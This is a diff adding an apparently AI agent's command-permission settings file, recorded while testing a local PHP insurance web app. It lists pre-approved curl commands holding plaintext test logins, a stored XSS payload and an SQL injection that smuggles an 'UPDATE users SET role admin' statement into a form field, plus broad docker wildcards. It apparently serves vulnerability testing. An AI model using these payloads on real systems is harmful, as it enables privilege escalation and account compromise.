@@ -1,0 +1,27 @@
+{
+  "permissions": {
+    "allow": [
+      "Bash(command -v php)",
+      "Bash(command -v docker)",
+      "Bash(docker run *)",
+      "Bash(docker compose *)",
+      "PowerShell(netsh interface ipv4 show excludedportrange protocol=tcp)",
+      "Bash(cd /tmp)",
+      "Bash(rm -f cj.txt)",
+      "Bash(curl -s -i -c cj.txt -b cj.txt -X POST __TRACKED_VAR__/login --data 'email=iiiishan@cloudinsure.local&password=Password@1')",
+      "Bash(rm -f mj.txt)",
+      "Bash(curl -s -o /dev/null -c mj.txt -b mj.txt -X POST __TRACKED_VAR__/login --data 'email=analyst@cloudinsure.local&password=Analyst@1')",
+      "Bash(curl -s -o /dev/null -b mj.txt -X POST __TRACKED_VAR__/announcement/store --data-urlencode title=__TRACKED_VAR__ --data-urlencode 'body=<p>hi</p>' --data-urlencode category_id=1)",
+      "Bash(docker exec *)",
+      "Bash(curl -s -o /dev/null -b mj.txt -X POST __TRACKED_VAR__/announcement/store --data-urlencode title=xsstest --data-urlencode 'body=<img src=x onerror=alert\\(document.domain\\)>' --data-urlencode category_id=1)",
+      "Bash(curl -s -b mj.txt __TRACKED_VAR__/announcement/__TRACKED_VAR__)",
+      "Bash(curl -s -o /dev/null -w \"%{http_code}\" http://localhost:8888/login)",
+      "Bash(curl -s -o /dev/null -w \"%{http_code}\\\\n\" http://localhost:8888/login)",
+      "Bash(curl -s -b j.txt http://localhost:8888/subrogation/3)",
+      "Bash(rm -f a.txt)",
+      "Bash(curl -s -o /dev/null -c a.txt -b a.txt -X POST __TRACKED_VAR__/login --data 'email=iiiishan@cloudinsure.local&password=Password@1')",
+      "Bash(curl -s -o /dev/null -b a.txt -X POST __TRACKED_VAR__/announcement/store --data-urlencode 'title=x'\\\\'', 1, '\\\\''b'\\\\'', '\\\\'''\\\\'', 1, '\\\\''2026-01-01'\\\\'', '\\\\''2026-12-31'\\\\'', 1\\); UPDATE users SET role='\\\\''admin'\\\\'' WHERE email='\\\\''iiiishan@cloudinsure.local'\\\\'';-- -' --data-urlencode body=test --data-urlencode category_id=1)",
+      "Bash(curl -s -b a.txt __TRACKED_VAR__/profile)"
+    ]
+  }
+}
